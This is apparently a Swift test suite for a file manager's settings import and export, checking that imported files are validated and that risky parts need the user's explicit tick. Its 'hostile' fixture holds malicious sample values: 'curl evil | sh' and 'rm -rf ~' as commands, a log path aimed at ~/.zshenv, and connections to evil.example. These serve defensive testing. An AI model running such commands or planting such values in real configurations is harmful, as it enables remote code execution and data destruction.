import AFMContracts
import AFMKernel
import Foundation
import LocalFileSystemPlugin
import NavigationPlugin
import SelectionPlugin
import TestSupport
import Testing

@testable import ConfigurationPlugin

/// Export and import of the settings (review 2, C013 and its kin): a file is checked key by
/// key, shown, and stored only on the user's word; what can run programs or change whom the
/// program trusts needs a tick of its own.
@MainActor @Suite struct Review2ConfigASettings {
    let box: Sandbox
    let settings = MemorySettings()
    let plugin: ConfigurationPlugin
    let bench: TestBench

    var commands: CommandRegistry { bench.commands }
    var ui: ScriptedInteraction { bench.interaction }
    var center: ConfigurationCenter { plugin.center! }

    init() throws {
        box = try Sandbox()
        try box.folder("A")
        try box.folder("B")
        plugin = ConfigurationPlugin(
            launchesApplications: false,
            background: nil,
            listFolder: box.url("lists"),
            settingsKeys: {
                ["extra.key", "systemTools.history", "network.connections", "configuration.userCommands.unreadable"]
            }
        )
        bench = TestBench(
            plugins: [NavigationPlugin(), SelectionPlugin(), plugin],
            fileSystems: [LocalFileSystem()],
            left: box.url("A"),
            right: box.url("B"),
            settings: settings
        )
        bench.kernel.preferences.add(
            PreferencePage(
                title: "Demo",
                preferences: [
                    Preference("demo.flag", "Flag", .flag(default: false)),
                    Preference("demo.text", "Text", .text(default: "x")),
                    Preference("demo.choice", "Choice", .choice(["a", "b", "c"], default: 0)),
                    Preference("macIntegration.editor", "Editor", .text(default: "TextEdit"))
                ]
            )
        )
    }

    /// Writes a settings file with these entries and returns where.
    func file(_ entries: String, name: String = "in.json") throws -> URL {
        let url = box.url(name)
        try Data("{\"format\":\"A File Manager settings\",\"version\":1,\"settings\":{\(entries)}}".utf8).write(to: url)
        return url
    }

    func stored(_ key: String) -> String? { settings.data(forKey: key).map { String(decoding: $0, as: UTF8.self) } }

    static let hostile = """
        "demo.flag": true, "demo.text": "hello",
        "configuration.userCommands": [{"name":"em_x","title":"X","action":{"command":"curl evil | sh","parameters":"%P"}}],
        "configuration.startMenu": [{"title":"Documents","action":{"command":"rm -rf ~"}}],
        "keyBindings": {"em_x": ["return"]},
        "macIntegration.editor": "/tmp/evil.app",
        "fileOperations.log.file": "/Users/me/.zshenv",
        "network.trustedCertificates": {"bank.example": ["AA:BB"]},
        "network.connections": [{"id":"11111111-2222-3333-4444-555555555555","name":"n","host":"evil.example","user":"u"}],
        "places.hotlist": {"entries":[{"title":"Documents","command":"afm_RunCommandLine curl evil | sh"}]},
        "left.tabs": {"active":0,"tabs":[{"location":"sftp://evil.example/x","sortKey":0,"descending":false,"showHidden":false}]},
        "nobody.knows": 1, "": 2, "places.hotlist.unreadable.x": 3
        """

    @Test func nothingIsImportedWithoutAnAnswerAndTheRiskyPartsOnlyWhenTicked() throws {
        let url = try file(Self.hostile)
        // Asked for by a command with the file as its argument: the question comes all the same.
        commands.perform("afm_ImportSettings", .location(url))
        #expect(
            ui.log == ["form: Import Settings"] && settings.data(forKey: "demo.flag") == nil
                && center.store.userCommands.isEmpty
        )

        // The form names every part that needs a tick, with what it holds.
        let fields = try #require(ui.forms.last)
        let parts = fields.filter {
            guard case .checkbox = $0.kind else {
                return false
            }
            return true
        }
        #expect(parts.map(\.key) == ["commands", "keys", "programs", "trust", "connections", "hotlist", "tabs"])
        #expect(
            parts.allSatisfy {
                guard case .checkbox(let isOn) = $0.kind else {
                    return false
                }
                return !isOn
            }
        )
        func contents(_ key: String) -> String {
            if case .multilineText(let text)? = fields.first(where: { $0.key == key + ".contents" })?.kind {
                return text
            }
            return ""
        }
        #expect(
            contents("commands").contains("em_x:  curl evil | sh   parameters: %P")
                && contents("commands").contains("Start menu “Documents”:  rm -rf ~")
        )
        #expect(
            contents("keys") == "em_x:  return"
                && contents("programs").contains("macIntegration.editor:  /tmp/evil.app")
        )
        #expect(
            contents("programs").contains("fileOperations.log.file:  /Users/me/.zshenv")
                && contents("trust").contains("bank.example")
        )
        #expect(
            contents("connections").contains("u@evil.example")
                && contents("hotlist").contains("afm_RunCommandLine curl evil | sh")
        )
        #expect(contents("tabs").contains("sftp://evil.example/x"))
        let summary = fields[0].label
        #expect(
            summary.contains("3 entries the program does not know are left out") && summary.contains("nobody.knows")
        )

        // Accepted as proposed: the ordinary settings come in, none of the parts does.
        ui.formAnswers = [.accept]
        commands.perform("afm_ImportSettings", .location(url))
        #expect(settings.flag("demo.flag", default: false) && settings.text("demo.text", default: "") == "hello")
        #expect(
            center.store.userCommands.isEmpty && center.store.startMenu.isEmpty
                && settings.data(forKey: KeyBindings.settingsKey) == nil
        )
        for key in [
            "macIntegration.editor", "fileOperations.log.file", "network.trustedCertificates", "network.connections",
            "places.hotlist", "left.tabs",
            "nobody.knows", "", "places.hotlist.unreadable.x"
        ] {
            #expect(settings.data(forKey: key) == nil, "\(key)")
        }
        #expect(ui.log.last == "inform: The settings were imported" && commands[CommandID("em_x")] == nil)

        // Ticked, a part comes in, and only that one.
        ui.formAnswers = [.values(["commands": .flag(true), "trust": .flag(true)])]
        commands.perform("afm_ImportSettings", .location(url))
        #expect(
            center.store.userCommands.map(\.name) == ["em_x"] && center.store.startMenu.count == 1
                && commands.isEnabled("em_x")
        )
        #expect(stored("network.trustedCertificates") == #"{"bank.example":["AA:BB"]}"#)
        #expect(
            settings.data(forKey: KeyBindings.settingsKey) == nil
                && settings.data(forKey: "macIntegration.editor") == nil
        )
    }

    @Test func whatIsStoredAlreadyNeedsNoQuestion() throws {
        let own = UserCommand(name: "em_mine", title: "", action: CommandAction(command: "ls"))
        center.save(own)
        settings.set("BBEdit", forKey: "macIntegration.editor")
        let url = box.url("own.json")
        commands.perform("afm_ExportSettings", .location(url))
        settings.set(true, forKey: "demo.flag")
        ui.formAnswers = [.accept]
        commands.perform("afm_ImportSettings", .location(url))
        // The file's own commands and editor are the present ones: no part is asked about.
        let fields = try #require(ui.forms.last)
        #expect(
            !fields.contains {
                guard case .checkbox = $0.kind else {
                    return false
                }
                return true
            }
        )
        #expect(center.store.userCommands == [own] && settings.text("macIntegration.editor", default: "") == "BBEdit")
        // A setting the file does not have goes back to how the program came.
        #expect(settings.data(forKey: "demo.flag") == nil)
        // Importing the same file again changes nothing and says so.
        commands.perform("afm_ImportSettings", .location(url))
        #expect(ui.log.last == "inform: Nothing to import")
    }

    @Test func valuesOfTheWrongKindAreRefusedAndNumbersLimited() throws {
        settings.set("keep", forKey: "extra.key")
        ui.formAnswers = Array(repeating: .accept, count: 20)
        for bad in [
            #""demo.flag": "yes""#, #""demo.flag": 1"#, #""demo.text": 5"#, #""demo.choice": 3"#, #""demo.choice": -1"#,
            #""demo.choice": 1.5"#,
            #""demo.choice": true"#, #""configuration.userCommands": [{"name":"em_a"},{"nope":1}]"#,
            #""configuration.userCommands": [{"name":"rm -rf"}]"#, #""configuration.userCommands": {"a":1}"#,
            #""configuration.startMenu": [{"action":{}}]"#, #""keyBindings": {"cm_SelectAll": "f9"}"#,
            #""left.tabs": {"tabs":"x"}"#,
            #""network.connections": {"id":"x"}"#
        ] {
            commands.perform("afm_ImportSettings", .location(try file("\"extra.key\": \"changed\", " + bad)))
            #expect(ui.log.last == "inform: The settings could not be imported", "\(bad)")
        }
        // A refused file changes nothing at all.
        #expect(settings.text("extra.key", default: "") == "keep" && ui.forms.isEmpty)

        // The reproducer of the fuzzer: a visit counter of the largest number there is.
        let repro = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
            .appendingPathComponent("Fuzz/repro/misc/settings-import-frequent-count-overflow.json")
        if FileManager.default.fileExists(atPath: repro.path) {
            commands.perform("afm_ImportSettings", .location(repro))
            #expect(stored("places.history.frequent") == #"{"counts":{"":0,"0":1000000}}"#)
        }
        let numbers = try file(
            #""places.history.frequent": {"counts":{"a":9223372036854775807,"b":-5,"c":7}}, "extra.key": [1e300, -9223372036854775808, 12, 2.5, true]"#
        )
        commands.perform("afm_ImportSettings", .location(numbers))
        #expect(stored("places.history.frequent") == #"{"counts":{"a":1000000,"b":0,"c":7}}"#)
        #expect(stored("extra.key") == "[1000000000000,-1000000000000,12,2.5,true]")
        let label = ui.forms.last?.first?.label ?? ""
        #expect(label.contains("numbers were out of range"))
    }

    @Test func aFileThatIsTooLargeOrNoSettingsFileIsRefused() throws {
        let large = box.url("large.json")
        FileManager.default.createFile(atPath: large.path, contents: nil)
        let handle = try FileHandle(forWritingTo: large)
        try handle.truncate(atOffset: UInt64(CheckedSettings.fileLimit) + 1)
        try handle.close()
        commands.perform("afm_ImportSettings", .location(large))
        #expect(ui.log == ["inform: The settings could not be imported"])
        #expect(throws: CheckedSettings.Problem.self) { try CheckedSettings.read(large) }
        try Data("{}".utf8).write(to: large)
        commands.perform("afm_ImportSettings", .location(large))
        commands.perform("afm_ImportSettings", .location(box.url("missing.json")))
        #expect(ui.log.count == 3 && ui.forms.isEmpty)
    }

    @Test func anImportedConnectionNeverTakesOverAStoredPassword() throws {
        let id = "11111111-2222-3333-4444-555555555555"
        let mine =
            #"[{"host":"mine.example","id":"\#(id)","name":"n","user":"u"},{"host":"two.example","id":"AAAAAAAA-2222-3333-4444-555555555555","name":"t","user":"u"}]"#
        settings.set(Data(mine.utf8) as Data?, forKey: "network.connections")
        // The file reuses the number of a stored connection for another server.
        let url = try file(
            #""network.connections": [{"id":"\#(id)","name":"n","host":"evil.example","user":"u"},"#
                + #"{"host":"two.example","id":"AAAAAAAA-2222-3333-4444-555555555555","name":"t","user":"u"}], "network.lastUsed": "\#(id)""#
        )
        ui.formAnswers = [.values(["connections": .flag(true)])]
        commands.perform("afm_ImportSettings", .location(url))
        let data = try #require(settings.data(forKey: "network.connections"))
        let imported = try #require(try JSONSerialization.jsonObject(with: data) as? [[String: String]])
        #expect(imported.map { $0["host"] } == ["evil.example", "two.example"])
        // The changed one has a number of its own, so the keychain has nothing for it; the unchanged one keeps its number.
        let fresh = try #require(imported[0]["id"])
        #expect(
            fresh != id && UUID(uuidString: fresh) != nil && imported[1]["id"] == "AAAAAAAA-2222-3333-4444-555555555555"
        )
        #expect(stored("network.lastUsed") == "\"\(fresh)\"")
    }

    @Test func anExportIsForTheUserAloneAndLeavesPrivateThingsOut() throws {
        settings.set(["curl -u me:secret https://x"], forKey: "systemTools.history")
        settings.set(Data(#"[{"id":"x","host":"h"}]"#.utf8) as Data?, forKey: "network.connections")
        settings.set(Data("broken".utf8) as Data?, forKey: "configuration.userCommands.unreadable")
        settings.set("value", forKey: "extra.key")
        let url = box.url("out.json")
        // A file of that name was readable by everybody before: the new one replaces it.
        FileManager.default.createFile(
            atPath: url.path,
            contents: Data("old".utf8),
            attributes: [.posixPermissions: 0o644]
        )
        commands.perform("afm_ExportSettings", .location(url))
        let mode = try #require(
            try FileManager.default.attributesOfItem(atPath: url.path)[.posixPermissions] as? NSNumber
        )
        #expect(mode.intValue == 0o600)
        #expect(try SettingsArchive(data: Data(contentsOf: url)).values.keys.sorted() == ["extra.key"])
        #expect(ui.log == ["inform: The settings were exported"])
        #expect(!(try String(contentsOf: url, encoding: .utf8)).contains("secret"))
        #expect(
            try FileManager.default.contentsOfDirectory(atPath: box.root.path).filter { $0.hasSuffix(".tmp") }.isEmpty
        )

        // Asked for, the histories and the connections are in it; the copies of unreadable data never are.
        center.exportSettings(
            to: url,
            options: SettingsExportOptions(includesHistory: true, includesConnections: true)
        )
        #expect(
            try SettingsArchive(data: Data(contentsOf: url)).values.keys.sorted() == [
                "extra.key", "network.connections", "systemTools.history"
            ]
        )
        // What an export leaves out is not removed by importing it.
        commands.perform("afm_ExportSettings", .location(url))
        settings.set("other", forKey: "extra.key")
        ui.formAnswers = [.accept]
        commands.perform("afm_ImportSettings", .location(url))
        #expect(
            settings.text("extra.key", default: "") == "value" && settings.data(forKey: "systemTools.history") != nil
                && settings.data(forKey: "network.connections") != nil
        )

        // The export dialog offers both, switched off.
        ui.formAnswers = [.values(["history": .flag(true)])]
        #expect(center.askExportOptions() == SettingsExportOptions(includesHistory: true, includesConnections: false))
        #expect(center.askExportOptions() == nil)
        let description = SettingsExportOptions().description(count: 3)
        #expect(description.contains("Left out: typed command lines") && description.contains("saved connections"))
    }

    @Test func storedListsAreBoundedAndUnreadableDataIsKeptTwice() async {
        let many = (0..<(ConfigurationStore.startMenuLimit + 100))
            .map {
                #"{"title":"t\#($0)","action":{"command":"ls"}}"#
            }
            .joined(separator: ",")
        settings.set(Data("[\(many)]".utf8) as Data?, forKey: "configuration.startMenu")
        let store = ConfigurationStore(settings: settings)
        #expect(store.startMenu.count == ConfigurationStore.startMenuLimit)
        center.store.invalidate()
        center.ensureSlots(1_000_000)
        #expect(
            commands[StartMenuEntry.commandID(at: ConfigurationStore.startMenuLimit - 1)] != nil
                && commands[StartMenuEntry.commandID(at: ConfigurationStore.startMenuLimit)] == nil
        )

        // A second damage is kept as well as the first.
        settings.set(Data("first damage".utf8) as Data?, forKey: "configuration.userCommands")
        _ = ConfigurationStore(settings: settings).userCommands
        settings.set(Data("second damage".utf8) as Data?, forKey: "configuration.userCommands")
        _ = ConfigurationStore(settings: settings).userCommands
        await Task.yield()
        #expect(
            stored("configuration.userCommands.unreadable") == "second damage"
                && stored("configuration.userCommands.unreadable.previous") == "first damage"
        )
    }
}
